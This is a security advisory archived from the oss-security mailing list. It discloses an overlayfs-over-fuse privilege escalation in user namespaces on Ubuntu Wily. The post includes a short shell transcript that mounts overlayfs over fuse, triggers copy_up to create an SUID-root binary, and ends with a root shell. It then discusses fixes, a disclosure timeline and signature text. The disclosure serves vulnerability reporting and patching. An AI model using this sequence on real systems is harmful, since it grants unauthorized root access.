  oss-security - Overlayfs over Fuse Privilege Escalation in USERNS            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 24 Feb From: halfdog <me@...fdog.net> To: oss-security@...ts.openwall.com Subject: Overlayfs over Fuse Privilege Escalation in USERNS  -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1   Introduction: =============  * Problem description:  On Ubuntu Wily it is possible to place an USERNS overlayfs mount over a fuse mount. The fuse filesystem may contain SUID binaries, but those cannot be used to gain privileges due to nosuid mount options. But when touching such an SUID binary via overlayfs mount, this will trigger copy_up including all file attributes, thus creating a real SUID binary on the disk. Methods  Basic exploitation sequence is:      Mount fuse filesystem exposing one world writable SUID binary     Create USERNS     Mount overlayfs on top of fuse     Open the SUID binary RDWR in overlayfs, thus triggering copy_up  This can be archived, e.g.  test# mkdir fuse test# mv SuidExec RealFile test# ./FuseMinimal fuse test# ./UserNamespaceExec -- /bin/bash root# mkdir mnt upper work root# mount -t overlayfs -o lowerdir=fuse,upperdir=upper,workdir=work overlayfs mnt root# touch mnt/file touch: setting times of âmnt/fileâ: Permission denied root# umount mnt root# exit test# fusermount -u fuse test# ls -al upper/file - -rwsr-xr-x 1 root root Jan 22 upper/file test# upper/file /bin/bash root# id uid=0(root)   Results, Discussion: ====================  * Fixing the issue itself:  In my opinion, fuse filesystem allowed pretending to have files with different UIDs/GIDs in the local mount namespace, but they never had those properties, those files would have, when really stored on local disk. So e.g., the SUID binaries lost their SUID-properties and the owner could also modify arbitrary file content, even if file attributes were pretending, that he does not have access - by having control over the fuse process simulating the filesystem, such access control is futile. That is also the reason, why no other user than the one mounting the filesystem may have rights to access it by default.  Hence the workarounds should be to restrict access to fuse also only to the mount namespace where it was created.  * Avoiding numerous namespace issues in future:  In my opinion, enabing USERNS was a little too fast, as it exposes a lot of additional kernel code to users without any special capabilities in init-ns by using the elevated privileges within the container. This is also recognized by others, but there is dispute on the consequences to draw from that. See Patch to disable unprivileged userns ... on LKML [0].  I completely second the request to have options to disable the USERNS layer as it depends on the system type, if USERNS is a net gain regarding security or a net loss. It should be a gain on systems, where it allows to perform critical operations within a containment, a use-case where chroots are used currently. Without USERNS, those operations are likely to be performed with SUID helpers in the init-ns or privilege separation might be dropped completely as the overhead is too large for efficient work procedures.  On the other hand, systems where all processes have similar security level, e.g. as they all process the same data, further privilege separation is not easy. The USERNS support will add only new risks here.  Timeline: =========  * Discovery, report at Launchpad [1] * First feedback from Ubuntu, Seth Arnold alreay working on submitted but not yet accepted upstream patch * Feedback: first patch does not seem sufficient * Patch request to disable unprivileged userns due to this and other issues LKML [0] * Bugfix by Seth Forshee available on Ubuntu Launchpad * linked on Launchpad [2] * CRD and publication   References: ===========  [0] [1] [2]  - --  http://www.halfdog.net/ PGP: AE98 B91F FE88  2BD8 feed a bee -----BEGIN PGP SIGNATURE----- Version: GnuPG v1  =FO71 -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      